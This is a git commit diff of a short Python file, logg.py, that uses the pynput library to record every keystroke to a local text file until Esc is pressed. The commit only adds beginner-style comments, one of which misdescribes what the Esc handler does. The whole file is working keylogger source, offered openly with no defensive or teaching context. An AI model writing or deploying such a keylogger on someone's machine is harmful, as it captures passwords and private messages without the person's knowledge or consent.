75b0dc7fc4a41bb38a2fb88fb7974b41092cf250
johnysilvergun <159545662+johnysilvergun@users.noreply.github.com>
2024-04-21 16:42:17 +0700

    logg.py

--- logg.py
+++ logg.py
@@ -1,12 +1,17 @@
 import sys
 from pynput.keyboard import Listener,Key
+# ^ install the pynput libary from the command line first
 def key_pressed (key):
     with open ("loggs.txt","a") as logs_file:
         logs_file.write(str({key}))
         logs_file.write("\n")
+        # ^ this write the keystrokes as text in a file
 def key_unpressed (key):
     if key == Key.esc:
         return 0
-
+        # ^ when key unpress will record next keystroke
 with Listener (on_press=key_pressed,on_release= key_unpressed) as listener :
     listener.join()
+
+
+#512-04
